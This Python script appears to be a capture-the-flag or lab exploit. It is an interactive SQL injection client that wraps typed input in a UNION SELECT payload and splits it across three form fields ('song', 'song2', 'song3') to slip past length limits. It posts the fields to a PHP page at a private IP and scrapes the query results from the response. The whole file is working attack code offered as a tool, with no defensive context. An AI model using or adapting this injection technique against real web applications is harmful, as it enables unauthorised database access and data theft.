import readline
from subprocess import Popen, PIPE
import sys
import random
import pwn
import time
import fileinput
import requests

p = len('123456789abcdefghijklmnopqrst')
while True:

    sql = input('sql> ').strip()
    sql = "' union select 0,0,0,0,"+sql+" -- "
    data={
        "song":  sql[0:p],
        "song2":  sql[p:2*p],
        "song3":  sql[2*p:3*p],
    }
    if len(sql) > 3*p :
        print('too long ' + sql[:3*p])
        continue
    print(data)
    rsp = requests.post(f'http://10.10.1.12:881/index.php', data)
    # rsp = requests.post(f'http://10.10.1.12:881/index.php',data={
    #     "song":  '',
    #     "song2":  '',
    #     "song3":  '',
    # })
    
    try:
        res = rsp.text.split('SELECT')[1]
        for line in res.split('<tr style="color: #8888ff; font-size:20px;">'[1:]):
            print(line)
    except:
        print(rsp.text)